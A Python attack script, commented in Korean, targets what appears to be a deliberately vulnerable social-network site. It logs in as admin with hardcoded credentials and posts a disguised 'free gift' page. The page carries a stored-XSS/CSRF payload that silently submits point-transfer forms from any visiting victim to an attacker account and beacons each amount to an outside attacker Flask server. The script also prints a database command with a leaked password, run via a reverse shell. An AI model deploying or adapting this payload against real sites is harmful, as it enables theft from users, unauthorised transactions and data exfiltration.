#!/usr/bin/env python3
"""
fake-gift CSRF 공격 - 완전 수정 버전
- 새로고침 문제 해결
- 정확한 포인트 카운팅
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"
INDEX_URL = f"{TARGET}/index.php"

# 완전 수정된 fake-gift HTML
FAKE_GIFT_HTML = """<div id="giftbox" style="font-family:Arial;text-align:center;padding:50px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;margin:0"><div style="background:white;color:#333;padding:50px;border-radius:20px;max-width:500px;margin:0 auto;box-shadow:0 20px 60px rgba(0,0,0,0.3)"><div style="font-size:100px">🎁</div><h1 style="color:#667eea">🎉 축하합니다!</h1><p style="font-size:1.5em">10,000 포인트를 받으셨습니다!</p><div id="s" style="background:#f0f0f0;padding:15px;border-radius:10px;margin:20px 0;color:#667eea;font-weight:bold">처리 중...</div></div><div id="f"></div></div><script>(function(){if(localStorage.getItem('gift_claimed')){document.getElementById('giftbox').innerHTML='<div style="text-align:center;padding:20px;color:#666">이미 받으셨습니다!</div>';return}localStorage.setItem('gift_claimed','1');const A='http://13.158.67.78:5000';let stolen=0,completed=false;function n(e,p){if(!completed){const i=new Image();i.src=A+e+'?'+p+'&t='+Date.now()}}const am=[50000,30000,20000,10000,5000,3000,2000,1000,500,300,200,100];let h='';am.forEach((a,i)=>{h+='<form id="f'+i+'" method="POST" action="http://52.78.221.104/profile.php" target="if'+i+'"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+a+'"><input type="hidden" name="message" value="E"></form><iframe name="if'+i+'" style="display:none"></iframe>'});document.getElementById('f').innerHTML=h;n('/notify','event=load');let idx=0;function next(){if(completed||idx>=am.length)return;const fid='f'+idx;const amt=am[idx];idx++;document.getElementById(fid).submit();document.getElementById('s').innerHTML='처리 중... '+Math.round(idx/am.length*100)+'%';setTimeout(()=>{stolen+=amt;n('/transfer','amount='+amt);console.log('[+]',amt+'P');if(idx>=am.length){completed=true;n('/complete','total='+stolen);document.getElementById('s').innerHTML='완료!';console.log('[+] Total:',stolen+'P')}else{next()}},400)}next()})();</script>"""

print("="*60)
print("🎁 fake-gift 완전 수정 버전")
print("="*60)
print()

session = requests.Session()

print("[*] admin으로 로그인 중...")
r = session.post(LOGIN_URL, data={'username': 'admin', 'password': 'admin123'}, allow_redirects=True)

if 'index.php' in r.url or 'profile.php' in r.url:
    print("[+] 로그인 성공!")
else:
    print("[-] 로그인 실패")
    exit(1)

print("\n[*] 기존 게시물 삭제 필요:")
print("    리버스 쉘: mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"DELETE FROM posts WHERE content LIKE '%🎁%';\"")

print("\n[*] 완전 수정 버전 게시 중...")
r = session.post(POST_URL, data={'content': FAKE_GIFT_HTML}, allow_redirects=True)

print(f"[+] 응답 코드: {r.status_code}")

r = session.get(INDEX_URL)
if '🎁' in r.text:
    print("[+] fake-gift 페이지 게시 완료!")
    print()
    print("="*60)
    print("✅ 완전 수정 버전 배포!")
    print("="*60)
    print()
    print("수정 사항:")
    print("- ❌ 자동 리다이렉트 제거 (페이지 안 넘어감)")
    print("- ✅ 순차 실행 (중복 카운팅 방지)")
    print("- ✅ 성공한 것만 Flask에 전송")
    print("- ✅ localStorage로 1회만 실행")
    print()
    print("테스트:")
    print("1. Flask 리셋: curl http://13.158.67.78:5000/reset")
    print("2. alice 포인트 복구: 500P")
    print("3. alice 로그인 (시크릿 모드)")
    print("4. index.php 접속")
    print("5. 콘솔 확인: [+] 500P, [+] 300P, ... (차감 성공만)")
    print("6. Flask: 실제 차감된 포인트만 표시")
    print()
    print("="*60)
else:
    print("[-] 게시물 확인 실패")
